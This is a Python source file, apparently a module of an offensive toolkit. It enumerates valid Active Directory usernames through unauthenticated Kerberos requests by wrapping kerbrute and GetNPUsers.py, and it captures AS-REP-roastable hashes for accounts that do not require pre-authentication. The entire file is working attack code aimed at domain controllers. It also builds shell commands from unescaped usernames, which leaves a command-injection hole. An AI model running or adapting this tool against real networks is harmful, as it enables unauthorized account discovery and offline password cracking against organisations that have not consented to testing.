"""
Kerberos User Enumeration Module
Enumerate valid domain users via Kerberos without authentication
"""

from core.module_base import ModuleBase, ModuleType, Platform


class KerberosUserEnum(ModuleBase):
    """
    Kerberos user enumeration module.
    Uses Kerberos pre-authentication to enumerate valid domain users.
    Does not require valid credentials - only needs a wordlist.
    """

    def __init__(self):
        super().__init__()
        self.name = "kerb_userenum"
        self.description = "Enumerate valid domain users via Kerberos (no auth required)"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "kerberos", "enumeration", "users", "unauthenticated"]
        self.references = [
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast",
            "https://github.com/ropnop/kerbrute"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name (e.g., corp.local)", required=True)

        # User enumeration options
        self.register_option("USERLIST", "File containing usernames to test", default="")
        self.register_option("USERS", "Comma-separated list of users to test", default="")

        # Output
        self.register_option("OUTPUT", "Output file for valid users", default="valid_users.txt")

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        userlist = self.get_option("USERLIST")
        users = self.get_option("USERS")
        output = self.get_option("OUTPUT")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_line()

        # Get user list
        test_users = []

        if users:
            test_users.extend([u.strip() for u in users.split(',')])

        if userlist:
            ret, stdout, stderr = self.run_in_exegol(f"cat {userlist}", timeout=10)
            if ret == 0:
                test_users.extend([u.strip() for u in stdout.split('\n') if u.strip()])

        if not test_users:
            # Default common userlist
            test_users = [
                "administrator", "admin", "guest", "krbtgt",
                "user", "test", "service", "backup",
                "sql", "web", "ftp", "mail"
            ]
            self.print_warning("No userlist provided, using default common users")

        self.print_status(f"Testing {len(test_users)} usernames...")
        self.print_line()

        valid_users = []

        # Method 1: Try kerbrute if available
        success = self._enum_kerbrute(dc_ip, domain, test_users, valid_users)

        if not success:
            # Method 2: Fall back to GetNPUsers.py
            self._enum_getnpusers(dc_ip, domain, test_users, valid_users)

        # Display results
        self.print_line()
        if valid_users:
            self.print_good(f"Found {len(valid_users)} valid users:")
            for user in valid_users:
                self.print_good(f"  {user}")

            # Save to file
            if output:
                with open(output, 'w') as f:
                    f.write('\n'.join(valid_users))
                self.print_status(f"Saved to: {output}")

            return True
        else:
            self.print_warning("No valid users found")
            return False

    def _enum_kerbrute(self, dc_ip: str, domain: str, users: list, valid_users: list) -> bool:
        """Enumerate users using kerbrute"""
        self.print_status("Attempting enumeration via kerbrute...")

        # Create temp userlist
        userlist_content = '\n'.join(users)
        ret, stdout, stderr = self.run_in_exegol(
            f"echo '{userlist_content}' > /tmp/uwu_users.txt && kerbrute userenum --dc {dc_ip} -d {domain} /tmp/uwu_users.txt 2>&1",
            timeout=120
        )

        if "command not found" in stderr or ret != 0:
            self.print_warning("kerbrute not available")
            return False

        output = stdout + stderr

        # Parse kerbrute output
        for line in output.split('\n'):
            if "VALID USERNAME:" in line:
                # Extract username
                parts = line.split("VALID USERNAME:")
                if len(parts) > 1:
                    user = parts[1].strip().split('@')[0]
                    if user and user not in valid_users:
                        valid_users.append(user)
                        self.print_good(f"Valid: {user}")

        return True

    def _enum_getnpusers(self, dc_ip: str, domain: str, users: list, valid_users: list) -> bool:
        """Enumerate users using GetNPUsers.py"""
        self.print_status("Attempting enumeration via GetNPUsers.py...")

        for user in users:
            cmd = f"GetNPUsers.py {domain}/{user} -dc-ip {dc_ip} -no-pass 2>&1"
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=15)
            output = stdout + stderr

            # Check response
            if "Client not found" in output or "KDC_ERR_C_PRINCIPAL_UNKNOWN" in output:
                # Invalid user
                continue
            elif "KDC_ERR_PREAUTH_REQUIRED" in output:
                # Valid user (preauth required)
                if user not in valid_users:
                    valid_users.append(user)
                    self.print_good(f"Valid: {user}")
            elif "$krb5asrep$" in output:
                # Valid user AND ASREProastable!
                if user not in valid_users:
                    valid_users.append(user)
                    self.print_good(f"Valid + ASREProastable: {user}")
                    # Save the hash
                    for line in output.split('\n'):
                        if "$krb5asrep$" in line:
                            self.print_warning(f"  Hash: {line.strip()[:80]}...")
            elif "UF_DONT_REQUIRE_PREAUTH" in output:
                if user not in valid_users:
                    valid_users.append(user)
                    self.print_good(f"Valid: {user}")

        return True

    def check(self) -> bool:
        """Check if required tools are available"""
        ret, stdout, stderr = self.run_in_exegol("which GetNPUsers.py || which kerbrute", timeout=10)
        return ret == 0
